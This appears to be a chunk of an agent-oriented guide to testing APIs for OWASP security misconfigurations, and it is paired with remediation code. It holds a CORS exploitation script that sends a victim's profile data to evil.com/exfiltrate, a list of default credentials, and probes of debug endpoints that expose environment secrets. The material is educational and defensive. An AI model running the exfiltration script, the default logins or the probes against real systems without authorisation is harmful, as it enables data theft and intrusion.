# Security Misconfiguration Testing (API8:2023) — Agent Chunk 18
> Source: 06-owasp-api-top-10-research.md (lines 2568-2843)
> Purpose: Guide an agent to detect verbose errors, default credentials, CORS misconfigurations, missing security headers, debug endpoints, and exposed API documentation
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Send malformed requests to trigger error responses and check for stack traces, database credentials, or internal paths in the output. Test CORS by sending requests with attacker-controlled Origin headers and checking if they are reflected with Access-Control-Allow-Credentials: true. Probe for debug endpoints (/actuator, /debug, /__graphql, /swagger.json). Check all responses for missing security headers (HSTS, X-Content-Type-Options, CSP). Test for unnecessary HTTP methods (TRACE, CONNECT) and default credentials on admin panels.

---

## API8:2023 — Security Misconfiguration

### 8.1 Technical Definition

Security Misconfiguration is a broad category encompassing any security weakness that arises from improper configuration of the API, its underlying frameworks, web servers, cloud services, or supporting infrastructure. Unlike the other categories which describe specific vulnerability classes, misconfiguration is about failing to apply security best practices across the technology stack.

### 8.2 Verbose Error Messages

```http
# Detailed error response exposing internals
GET /api/v1/users/abc HTTP/1.1

HTTP/1.1 500 Internal Server Error
{
  "error": "CastError",
  "message": "Cast to ObjectId failed for value \"abc\" at path \"_id\" for model \"User\"",
  "stack": "CastError: Cast to ObjectId failed...\n    at model.Query...\n    at /app/node_modules/mongoose/lib/query.js:4845:21\n    at /app/node_modules/mongoose/lib/query.js:4871:11",
  "details": {
    "database": "mongodb://app_user:s3cret_p4ss@db-primary.internal:27017/production",
    "collection": "users",
    "driver_version": "mongoose@7.6.3",
    "node_version": "v18.19.0",
    "framework": "express@4.18.2"
  }
}
```

This single error response reveals:
- Database type (MongoDB)
- Database credentials (app_user:s3cret_p4ss)
- Internal hostname (db-primary.internal)
- Database name (production)
- ORM and version (mongoose 7.6.3)
- Node.js version (18.19.0)
- Framework and version (Express 4.18.2)
- Internal file paths (/app/node_modules/...)

**Remediation:**
```python
# Production error handling -- return generic errors
@app.errorhandler(Exception)
def handle_error(error):
    # Log the full error internally
    app.logger.error(f"Unhandled error: {error}", exc_info=True)
    
    # Return generic error to client
    return jsonify({
        "error": "Internal server error",
        "request_id": generate_request_id()  # For support reference
    }), 500
```

### 8.3 Default Credentials

API management platforms, databases, and admin panels frequently ship with default credentials:

```
# Common default credentials found in production
admin:admin
admin:password
admin:changeme
root:root
test:test
api:api123
administrator:administrator

# Default credentials on specific platforms
# API Gateway X: admin / admin123
# Database admin panel: postgres / postgres
# Message queue UI: guest / guest (RabbitMQ)
# Cache admin: (no auth by default - Redis)
# Search engine: (no auth by default - Elasticsearch on older versions)
# Monitoring dashboard: admin / admin (Grafana default)
```

### 8.4 Unnecessary HTTP Methods

```http
# Check which methods are enabled
OPTIONS /api/v1/users HTTP/1.1

HTTP/1.1 200 OK
Allow: GET, POST, PUT, PATCH, DELETE, OPTIONS, TRACE, CONNECT

# TRACE can be used for Cross-Site Tracing (XST)
TRACE /api/v1/users HTTP/1.1
Host: api.example.com
Cookie: session=secret_token
X-Custom-Header: sensitive_data

# Server echoes the entire request back, including cookies and headers
# This can be exploited via XSS to steal HttpOnly cookies
```

### 8.5 Missing Security Headers

```http
# Essential security headers for API responses
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Cache-Control: no-store
Content-Security-Policy: default-src 'none'; frame-ancestors 'none'
Referrer-Policy: no-referrer
Permissions-Policy: geolocation=(), camera=(), microphone=()
```

### 8.6 CORS Misconfiguration

Cross-Origin Resource Sharing (CORS) misconfigurations in APIs are a critical attack vector:

```http
# Reflected Origin -- the server mirrors any Origin header
OPTIONS /api/v1/user/data HTTP/1.1
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
# Any website can now make credentialed requests to this API!
```

```http
# Null Origin allowed
OPTIONS /api/v1/user/data HTTP/1.1
Origin: null

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
# Sandboxed iframes and data: URIs send "null" as the origin
```

```http
# Weak regex validation
# Server allows *.example.com but uses a flawed regex
OPTIONS /api/v1/user/data HTTP/1.1
Origin: https://evilexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evilexample.com
Access-Control-Allow-Credentials: true
# The regex matched "example.com" as a substring, not as the exact domain
```

```http
# Wildcard with credentials (invalid but sometimes misconfigured)
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
# Browsers should reject this combination, but server-side API consumers don't enforce CORS
```

**CORS exploitation for data theft:**
```html
<!-- Attacker's page on evil.com -->
<script>
fetch('https://api.example.com/api/v1/user/profile', {
    credentials: 'include'  // Send the victim's cookies
})
.then(response => response.json())
.then(data => {
    // Exfiltrate the victim's data to the attacker's server
    fetch('https://evil.com/exfiltrate', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
</script>
```

**Secure CORS configuration:**
```python
from flask_cors import CORS

ALLOWED_ORIGINS = [
    'https://app.example.com',
    'https://admin.example.com',
]

# Strict origin validation
CORS(app, 
     origins=ALLOWED_ORIGINS,           # Explicit whitelist, no wildcards
     allow_credentials=True,            # Only with explicit origins
     methods=['GET', 'POST', 'PUT'],    # Only needed methods
     allow_headers=['Authorization', 'Content-Type'],  # Only needed headers
     max_age=86400)                     # Cache preflight for 24 hours
```

### 8.7 TLS Configuration Issues

```bash
# Testing TLS configuration
nmap --script ssl-enum-ciphers -p 443 api.example.com

# Common issues:
# - TLS 1.0/1.1 still enabled (should be TLS 1.2+ only)
# - Weak cipher suites (RC4, DES, 3DES, export ciphers)
# - Missing HSTS header
# - Self-signed or expired certificates
# - Certificate hostname mismatch
# - Missing certificate chain (intermediate certificates)
```

### 8.8 Debug Endpoints in Production

```http
# Common debug endpoints left in production
GET /api/v1/debug HTTP/1.1
GET /api/v1/health/detailed HTTP/1.1
GET /api/v1/status HTTP/1.1
GET /api/v1/info HTTP/1.1
GET /api/v1/env HTTP/1.1
GET /api/v1/config HTTP/1.1
GET /api/v1/phpinfo.php HTTP/1.1
GET /api/v1/__debug__ HTTP/1.1
GET /api/v1/actuator HTTP/1.1        # Spring Boot Actuator
GET /api/v1/actuator/env HTTP/1.1     # Exposes environment variables
GET /api/v1/actuator/heapdump HTTP/1.1 # JVM heap dump (may contain secrets)
GET /api/v1/actuator/configprops HTTP/1.1
GET /__graphql HTTP/1.1               # GraphQL playground
GET /graphql?query={__schema{types{name}}} # GraphQL introspection
```

**Spring Boot Actuator exposure is particularly dangerous:**
```http
GET /actuator/env HTTP/1.1
# Returns ALL environment variables including:
# DATABASE_URL, AWS_SECRET_ACCESS_KEY, API_KEYS, JWT_SECRET, etc.

GET /actuator/heapdump HTTP/1.1
# Returns a JVM heap dump that can be analyzed to extract:
# - Active session tokens
# - Database passwords
# - Encryption keys
# - Any data currently in memory
```

### 8.9 Exposed API Documentation

```http
# OpenAPI/Swagger documentation accessible without authentication
GET /swagger.json HTTP/1.1
GET /openapi.json HTTP/1.1
GET /api-docs HTTP/1.1
GET /swagger-ui.html HTTP/1.1
GET /api/v1/docs HTTP/1.1
GET /redoc HTTP/1.1

# These may expose:
# - All endpoints including internal/admin ones
# - Request/response schemas with sensitive field names
# - Authentication mechanisms
# - Rate limiting details
# - Server URLs (internal hostnames, staging environments)
# - Example values that may be real data
```

### 8.10 Remediation Summary

- Automate security configuration checks as part of CI/CD
- Use security scanning tools (e.g., Mozilla Observatory, SSL Labs, security header checkers)
- Implement infrastructure-as-code with security baselines
- Disable all unnecessary features, methods, and endpoints in production
- Remove or restrict access to debug endpoints and admin panels
- Use environment-specific configuration (never use development settings in production)
- Set restrictive CORS policies with explicit origin whitelists
- Configure proper error handling that does not expose internal details
- Regularly rotate credentials and never use defaults
- Restrict API documentation access (require authentication or limit to internal network)
- Disable GraphQL introspection in production or restrict it to authenticated admin users
- Enforce TLS 1.2+ with strong cipher suites
- Implement security headers on all API responses
- Conduct regular security audits of configuration across all environments
